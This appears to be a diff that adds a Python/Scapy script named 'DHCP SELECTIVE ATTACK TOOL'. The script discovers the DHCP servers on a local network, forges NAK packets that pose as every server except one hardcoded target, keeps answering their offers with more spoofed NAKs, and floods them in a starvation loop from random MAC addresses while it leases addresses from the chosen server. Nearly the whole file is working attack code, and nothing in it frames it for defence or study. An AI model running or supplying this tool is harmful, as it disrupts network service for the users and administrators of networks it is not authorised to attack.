@@ -1,0 +1,341 @@
+#!/usr/bin/env python3
+import sys
+import time
+import random
+from scapy.all import *
+from threading import Thread
+import signal
+
+class DHCPSelectiveAttack:
+    def __init__(self, interface, target_server_ip, target_server_mac, network_cidr="192.168.145.0/24"):
+        self.interface = interface
+        self.target_server_ip = target_server_ip
+        self.target_server_mac = target_server_mac
+        self.network = network_cidr
+        self.blocked_servers = {}
+        self.my_mac = get_if_hwaddr(interface)
+        self.running = True
+        
+        signal.signal(signal.SIGINT, self.signal_handler)
+        
+    def signal_handler(self, sig, frame):
+        print("\n[*] Shutdown signal received")
+        self.running = False
+        
+    def send_dhcp_discover(self, fake_mac=None):
+        if fake_mac is None:
+            fake_mac = RandMAC()
+            
+        xid = random.randint(1, 0xFFFFFFFF)
+        
+        discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
+                  IP(src="0.0.0.0", dst="255.255.255.255") / \
+                  UDP(sport=68, dport=67) / \
+                  BOOTP(chaddr=RandString(12, '0123456789abcdef'), xid=xid) / \
+                  DHCP(options=[("message-type", "discover"),
+                               ("param_req_list", [1, 3, 6, 15, 31, 33]),
+                               ("hostname", "client-pc"),
+                               "end"])
+        
+        sendp(discover, iface=self.interface, verbose=0)
+        return xid, fake_mac
+        
+    def find_all_dhcp_servers(self):
+        servers = {}
+        
+        def capture_responses(packet):
+            if packet.haslayer(DHCP):
+                option_value = packet[DHCP].options[0][1]
+                if option_value == 2:  # DHCP Offer
+                    server_ip = packet[IP].src
+                    server_mac = packet[Ether].src
+                    if server_ip not in servers:
+                        servers[server_ip] = {
+                            'mac': server_mac,
+                            'offers': 1
+                        }
+                    else:
+                        servers[server_ip]['offers'] += 1
+        
+        print("[*] Discovering all DHCP servers in network...")
+        
+        sniff_thread = Thread(target=lambda: sniff(filter="udp and (port 67 or port 68)", 
+                                                  prn=capture_responses, 
+                                                  timeout=10, 
+                                                  store=0))
+        sniff_thread.start()
+        time.sleep(1)
+        
+        for i in range(5):
+            self.send_dhcp_discover()
+            time.sleep(0.3)
+            
+        sniff_thread.join()
+        return servers
+    
+    def block_other_servers(self):
+        all_servers = self.find_all_dhcp_servers()
+        
+        print(f"[+] Found {len(all_servers)} DHCP servers:")
+        for ip, info in all_servers.items():
+            status = "TARGET" if ip == self.target_server_ip else "BLOCKED"
+            print(f"    {ip} ({info['mac']}) - {status}")
+        
+        blocked_count = 0
+        for server_ip, info in all_servers.items():
+            if server_ip != self.target_server_ip:
+                if self.block_server(server_ip, info['mac']):
+                    self.blocked_servers[server_ip] = info['mac']
+                    blocked_count += 1
+        
+        return blocked_count
+    
+    def block_server(self, server_ip, server_mac):
+        print(f"[*] Blocking server {server_ip} ({server_mac})")
+        
+        for i in range(3):
+            nak_packet = Ether(src=self.my_mac, dst=server_mac) / \
+                        IP(src=server_ip, dst=server_ip) / \
+                        UDP(sport=67, dport=68) / \
+                        BOOTP(op=2, 
+                             yiaddr="0.0.0.0",
+                             siaddr=server_ip,
+                             giaddr="0.0.0.0",
+                             chaddr=RandString(12, '0123456789abcdef')) / \
+                        DHCP(options=[("message-type", "nak"),
+                                     ("server_id", server_ip),
+                                     "end"])
+            
+            sendp(nak_packet, iface=self.interface, verbose=0)
+            time.sleep(0.1)
+        
+        print(f"[+] Server {server_ip} blocked")
+        return True
+    
+    def get_ip_from_target_server(self):
+        xid, fake_mac = self.send_dhcp_discover()
+        time.sleep(1)
+        
+        target_offer = None
+        offered_ip = None
+        
+        def capture_target_offer(packet):
+            nonlocal target_offer, offered_ip
+            if packet.haslayer(DHCP):
+                if packet[DHCP].options[0][1] == 2:
+                    if packet[IP].src == self.target_server_ip:
+                        target_offer = packet
+                        offered_ip = packet[BOOTP].yiaddr
+                        return True
+            return False
+        
+        sniff(filter="udp and port 68", 
+              prn=capture_target_offer, 
+              timeout=3, 
+              store=0)
+        
+        if target_offer and offered_ip:
+            print(f"[+] Received offer from target: {offered_ip}")
+            
+            request = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
+                     IP(src="0.0.0.0", dst="255.255.255.255") / \
+                     UDP(sport=68, dport=67) / \
+                     BOOTP(chaddr=RandString(12, '0123456789abcdef'),
+                          xid=xid,
+                          yiaddr=offered_ip) / \
+                     DHCP(options=[("message-type", "request"),
+                                  ("server_id", self.target_server_ip),
+                                  ("requested_addr", offered_ip),
+                                  ("hostname", "trusted-client"),
+                                  "end"])
+            
+            sendp(request, iface=self.interface, verbose=0)
+            
+            ack_received = False
+            
+            def capture_ack(packet):
+                nonlocal ack_received
+                if packet.haslayer(DHCP):
+                    if packet[DHCP].options[0][1] == 5:
+                        if packet[IP].src == self.target_server_ip:
+                            ack_received = True
+                            print(f"[+] ACK received for IP {offered_ip}")
+                            return True
+                return False
+            
+            sniff(filter="udp and port 68", 
+                  prn=capture_ack, 
+                  timeout=3, 
+                  store=0)
+            
+            if ack_received:
+                print(f"[*] Successfully leased IP {offered_ip} from target server")
+                return offered_ip
+            else:
+                print("[-] No ACK received")
+        else:
+            print("[-] No offer from target server")
+            
+        return None
+    
+    def monitor_and_maintain_block(self):
+        def monitor_dhcp_traffic(packet):
+            if not packet.haslayer(DHCP):
+                return
+                
+            if packet[Ether].dst == "ff:ff:ff:ff:ff:ff":
+                return
+                
+            server_ip = packet[IP].src
+            server_mac = packet[Ether].src
+            
+            if server_ip in self.blocked_servers and server_ip != self.target_server_ip:
+                print(f"[*] Intercepting packet from blocked server {server_ip}")
+                
+                if packet.haslayer(DHCP):
+                    dhcp_type = packet[DHCP].options[0][1]
+                    
+                    if dhcp_type == 2:  # DHCP Offer
+                        print(f"[!] Blocked server {server_ip} trying to send offer")
+                        
+                        nak_response = Ether(src=self.my_mac, dst=server_mac) / \
+                                      IP(src=server_ip, dst=server_ip) / \
+                                      UDP(sport=67, dport=68) / \
+                                      BOOTP(op=2, yiaddr="0.0.0.0") / \
+                                      DHCP(options=[("message-type", "nak"),
+                                                   ("server_id", server_ip),
+                                                   "end"])
+                        
+                        sendp(nak_response, iface=self.interface, verbose=0)
+        
+        print("[*] Starting DHCP traffic monitor...")
+        
+        monitor_thread = Thread(target=lambda: sniff(iface=self.interface,
+                                                    filter="udp and port 67",
+                                                    prn=monitor_dhcp_traffic,
+                                                    store=0,
+                                                    stop_filter=lambda x: not self.running))
+        monitor_thread.daemon = True
+        monitor_thread.start()
+        return monitor_thread
+    
+    def starvation_attack_on_others(self):
+        print("[*] Starting DHCP starvation on other servers...")
+        
+        while self.running:
+            for server_ip, server_mac in list(self.blocked_servers.items()):
+                for i in range(10):
+                    if not self.running:
+                        return
+                        
+                    fake_mac = RandMAC()
+                    xid = random.randint(1, 0xFFFFFFFF)
+                    
+                    discover = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
+                              IP(src="0.0.0.0", dst="255.255.255.255") / \
+                              UDP(sport=68, dport=67) / \
+                              BOOTP(chaddr=RandString(12, '0123456789abcdef'), xid=xid) / \
+                              DHCP(options=[("message-type", "discover"),
+                                           ("server_id", server_ip),
+                                           "end"])
+                    
+                    sendp(discover, iface=self.interface, verbose=0)
+                    time.sleep(0.01)
+                    
+                    request = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
+                             IP(src="0.0.0.0", dst="255.255.255.255") / \
+                             UDP(sport=68, dport=67) / \
+                             BOOTP(chaddr=RandString(12, '0123456789abcdef'), xid=xid) / \
+                             DHCP(options=[("message-type", "request"),
+                                          ("server_id", server_ip),
+                                          ("requested_addr", f"192.168.145.{random.randint(100, 200)}"),
+                                          "end"])
+                    
+                    sendp(request, iface=self.interface, verbose=0)
+                    time.sleep(0.01)
+            
+            time.sleep(5)
+    
+    def start(self):
+        print("="*60)
+        print("DHCP SELECTIVE ATTACK TOOL")
+        print("="*60)
+        print(f"Interface: {self.interface}")
+        print(f"Target Server: {self.target_server_ip} ({self.target_server_mac})")
+        print(f"Network: {self.network}")
+        print("="*60)
+        
+        blocked = self.block_other_servers()
+        print(f"[+] Blocked {blocked} DHCP servers")
+        
+        monitor_thread = self.monitor_and_maintain_block()
+        
+        starvation_thread = Thread(target=self.starvation_attack_on_others)
+        starvation_thread.daemon = True
+        starvation_thread.start()
+        
+        lease_counter = 0
+        
+        try:
+            while self.running:
+                lease_counter += 1
+                print(f"\n[*] Attempt {lease_counter}: Getting IP from target server")
+                
+                obtained_ip = self.get_ip_from_target_server()
+                
+                if obtained_ip:
+                    print(f"[*] Successfully using IP: {obtained_ip}")
+                    print("[*] Maintaining lease for 5 minutes...")
+                    
+                    for i in range(30):
+                        if not self.running:
+                            break
+                        time.sleep(10)
+                        
+                        if i % 3 == 0:
+                            print(f"[*] Renewing presence...")
+                            xid, fake_mac = self.send_dhcp_discover()
+                else:
+                    print("[-] Failed to get IP, retrying in 10 seconds...")
+                    time.sleep(10)
+                    
+                if lease_counter % 5 == 0:
+                    print("[*] Scanning for new DHCP servers...")
+                    new_blocked = self.block_other_servers()
+                    if new_blocked > 0:
+                        print(f"[+] Blocked {new_blocked} new servers")
+                        
+        except KeyboardInterrupt:
+            print("\n[*] User interrupt")
+        except Exception as e:
+            print(f"[!] Error: {e}")
+        finally:
+            self.running = False
+            print("[*] Cleaning up...")
+            time.sleep(2)
+            print("[*] Attack stopped")
+
+def main():
+    if len(sys.argv) != 2:
+        print(f"Usage: {sys.argv[0]} <interface>")
+        print(f"Example: {sys.argv[0]} eth0")
+        print(f"Target server: 192.168.145.1 / 00:0c:29:4d:3c:41")
+        sys.exit(1)
+    
+    interface = sys.argv[1]
+    target_ip = "192.168.145.1"
+    target_mac = "00:0c:29:4d:3c:41"
+    
+    try:
+        attacker = DHCPSelectiveAttack(interface, target_ip, target_mac)
+        attacker.start()
+    except Exception as e:
+        print(f"[!] Fatal error: {e}")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print("[!] This tool requires root privileges")
+        sys.exit(1)
+    
+    main()
